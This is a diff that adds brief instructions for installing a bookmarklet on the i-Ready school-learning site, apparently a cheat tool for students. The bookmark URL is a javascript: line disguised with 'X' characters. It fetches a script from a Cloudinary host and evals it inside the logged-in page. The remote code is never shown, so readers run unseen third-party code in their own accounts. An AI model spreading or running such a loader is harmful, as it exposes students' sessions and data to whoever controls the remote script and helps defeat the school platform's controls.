@@ -1,0 +1,8 @@
+How to Install 
+1. Copy all the text
+2. go to iready and click the star
+3. click more or advanced
+4. change the url to the script below
+5. delet the both of the x's when you put it in the url section then press done and click the bookmark.
+
+XJavascriptX:fetch(`https://res.cloudinary.com/cupiditys/raw/upload/v${Math.floor(Math.random() * 9999999)}/bookmarklet.js`).then((res) => res.text().then((t) => eval(t)))
